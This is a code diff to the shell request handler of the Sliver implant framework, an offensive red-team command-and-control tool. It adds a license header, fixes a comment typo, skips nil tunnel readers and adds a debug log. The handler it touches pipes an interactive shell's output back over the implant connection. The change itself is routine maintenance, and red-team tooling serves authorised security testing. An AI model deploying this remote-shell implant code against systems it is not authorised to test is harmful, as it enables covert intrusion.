@@ -1,5 +1,23 @@
 package tunnel_handlers
 
+/*
+	Sliver Implant Framework
+	Copyright (C) 2022  Bishop Fox
+
+	This program is free software: you can redistribute it and/or modify
+	it under the terms of the GNU General Public License as published by
+	the Free Software Foundation, either version 3 of the License, or
+	(at your option) any later version.
+
+	This program is distributed in the hope that it will be useful,
+	but WITHOUT ANY WARRANTY; without even the implied warranty of
+	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+	GNU General Public License for more details.
+
+	You should have received a copy of the GNU General Public License
+	along with this program.  If not, see <https://www.gnu.org/licenses/>.
+*/
+
 import (
 
 	// {{if .Config.Debug}}
@@ -47,7 +65,7 @@ func ShellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 		return
 	}
 
-	// At this point, comand is already started by StartInteractive
+	// At this point, command is already started by StartInteractive
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[shell] Failed to spawn! err: %v", err)
@@ -102,11 +120,17 @@ func ShellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 	}
 
 	for _, rc := range tunnel.Readers {
+		if rc == nil {
+			continue
+		}
 		go func(outErr io.ReadCloser) {
 			tWriter := tunnelWriter{
 				conn: connection,
 				tun:  tunnel,
 			}
+			// {{if .Config.Debug}}
+			log.Printf("[shell] tWriter: %v outErr: %v", tWriter, outErr)
+			// {{end}}
 			_, err := io.Copy(tWriter, outErr)
 
 			if err != nil {
